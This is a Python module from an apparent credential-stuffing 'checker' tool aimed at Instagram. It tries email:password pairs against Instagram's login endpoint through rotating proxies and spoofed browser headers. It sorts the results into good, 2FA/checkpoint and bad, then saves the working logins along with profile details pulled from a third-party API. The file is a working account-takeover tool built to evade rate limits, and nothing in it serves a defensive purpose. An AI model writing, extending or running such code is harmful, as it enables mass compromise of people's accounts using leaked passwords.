from modules.variables import Checker
from requests import Session,get
from modules.functions import bad_proxy, log,save,set_proxy

def check(email:str,password:str):
    retries = 0

    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" ,
            "Content-Type": "application/x-www-form-urlencoded" ,
            "Accept-Language": "en-US,en;q=0.9" ,
            "X-Requested-With": "XMLHttpRequest" ,
            "Accept": "*/*" ,
            "Referer": "https://www.instagram.com/" ,
            "X-IG-App-ID": "936619743392459" ,
            "X-IG-WWW-Claim": "0" ,
            "X-Instagram-AJAX": "c1dcf20d99d7" ,
            "Sec-Fetch-Dest": "empty" ,
            "Sec-Fetch-Mode": "cors" ,
            "Sec-Fetch-Site": "same-origin" ,
            "X-CSRFToken": "missing" ,
            "Host": "www.instagram.com" ,
            "Connection": "Keep-Alive" ,
            "Content-Length": "85",
        }
        data = f"username={email}&enc_password=%23PWD_INSTAGRAM_BROWSER%3a0%3a1628896342%3a{password}" 

        try:
            with Session() as s:
                response = s.post("https://www.instagram.com/accounts/login/ajax/",data=data,headers=headers,proxies=proxy_set,timeout=Checker.timeout)
                if "\"authenticated\":false" in response.text:
                    retries += 1
                elif "\"user\":false" in response.text or "\"two_factor_required\":true" in response.text or "\"checkpoint_required\"" in response.text:
                    Checker.custom += 1
                    Checker.cpm += 1
                    if not Checker.cui:
                        log("custom",email+":"+password,"Instagram")
                    save("Instagram","custom",Checker.time,email+":"+password)
                    return
                elif "\"authenticated\":true" in response.text:
                    username = s.get("https://www.instagram.com/accounts/edit/",proxies=proxy_set,timeout=Checker.timeout).text.split("\"username\":\"")[1].split("\",\"")[0]

                    data = get(f"https://soud.me/api/Instagram?username={username}",timeout=Checker.timeout).json()
                    
                    name = data.get("info").get("name")
                    followers = data.get("info").get("followers")
                    following = data.get("info").get("following")
                    posts = data.get("info").get("media")
                    private = data.get("info").get("private")
                    bio = data.get("info").get("bio")

                    Checker.good += 1
                    Checker.cpm += 1
                    if not Checker.cui:
                        log("good",email+":"+password,"Instagram")
                    save("Instagram","good",Checker.time,email+":"+password+f" | Name: {name} | Followers: {followers} | Following: {following} | Posts: {posts} | Private: {private} | BIO: {bio}")
                    return
                else:
                    raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1 
    Checker.cpm += 1
    return